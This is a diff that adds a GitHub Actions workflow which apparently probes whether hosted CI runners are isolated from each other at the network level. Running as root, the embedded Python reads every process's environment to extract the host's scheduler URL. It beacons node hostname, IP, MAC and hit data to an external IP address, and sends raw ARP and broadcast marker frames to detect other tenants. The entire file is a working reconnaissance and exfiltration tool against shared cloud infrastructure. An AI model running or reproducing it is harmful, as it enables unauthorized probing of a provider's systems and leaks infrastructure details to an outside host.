@@ -1,0 +1,67 @@
+name: Owned peer MAC isolation receiver
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  receiver:
+    runs-on: ubuntu-slim
+    timeout-minutes: 8
+    strategy:
+      fail-fast: false
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6]
+    steps:
+      - name: Publish B address and emit controlled network markers
+        shell: bash
+        env:
+          SLOT: ${{ matrix.slot }}
+        run: |
+          sudo --preserve-env=GITHUB_RUN_ID,SLOT python3 - <<'PY'
+          import base64,glob,http.server,json,os,select,socket,struct,threading,time,urllib.parse,urllib.request
+
+          def hca_env():
+              for path in glob.glob('/proc/[0-9]*/environ'):
+                  try: items=open(path,'rb').read().split(b'\0')
+                  except OSError: continue
+                  d=dict(x.split(b'=',1) for x in items if b'=' in x)
+                  if b'scheduler_api_url' in d:return d
+              return {}
+          def beacon(name,obj):
+              data=base64.urlsafe_b64encode(json.dumps(obj,separators=(',',':')).encode()).decode()
+              try:urllib.request.urlopen('http://16.146.243.72:8450/'+name+'?d='+data,timeout=2).read()
+              except Exception:pass
+
+          hca=hca_env(); node=urllib.parse.urlsplit(hca[b'scheduler_api_url'].decode()).hostname
+          route=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);route.connect(('192.0.2.1',9));ip=route.getsockname()[0];route.close()
+          mac_text=open('/sys/class/net/eth0/address').read().strip();mac=bytes.fromhex(mac_text.replace(':',''))
+          marker=('MACB-3900000-%s-%s' % (os.environ['GITHUB_RUN_ID'],os.environ['SLOT'])).encode()
+          meta={'run':os.environ['GITHUB_RUN_ID'],'slot':os.environ['SLOT'],'node':node,'ip':ip,'mac':mac_text,'marker':marker.decode()}
+          beacon('MAC_B_META',meta); print('MAC_B_READY node=%s ip=%s mac=%s marker=%s' % (node,ip,mac_text,marker.decode()),flush=True)
+
+          raw=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(3));raw.bind(('eth0',0));raw.setblocking(False)
+          udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);udp.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);udp.bind(('0.0.0.0',39001));udp.setblocking(False)
+          bcast=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);bcast.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,1)
+          hits=[];next_send=0;next_beat=0;deadline=time.monotonic()+360
+          while time.monotonic()<deadline:
+              now=time.monotonic()
+              if now>=next_send:
+                  try:bcast.sendto(marker,('192.168.0.255',39002))
+                  except OSError:pass
+                  arp=struct.pack('!HHBBH6s4s6s4s',1,0x800,6,4,1,mac,socket.inet_aton(ip),b'\0'*6,socket.inet_aton('192.168.0.250'))
+                  try:raw.send(b'\xff'*6+mac+b'\x08\x06'+arp+marker)
+                  except OSError:pass
+                  next_send=now+.10
+              if now>=next_beat:beacon('MAC_B_BEAT',{'run':meta['run'],'slot':meta['slot'],'n':int(360-(deadline-now))//10});next_beat=now+10
+              ready,_,_=select.select([raw,udp],[],[],.02)
+              for s in ready:
+                  try:data,addr=(s.recvfrom(65535) if s is udp else (s.recv(65535),None))
+                  except OSError:continue
+                  if b'MACA-3900000-' not in data:continue
+                  hit={'run':meta['run'],'slot':meta['slot'],'kind':'udp' if s is udp else 'raw','bytes':len(data),'peer':str(addr)}
+                  hits.append(hit);beacon('MAC_B_HIT',hit);print('MAC_B_HIT '+json.dumps(hit),flush=True)
+                  if len(hits)>=8:deadline=now
+          beacon('MAC_B_DONE',{'run':meta['run'],'slot':meta['slot'],'hits':len(hits)})
+          PY
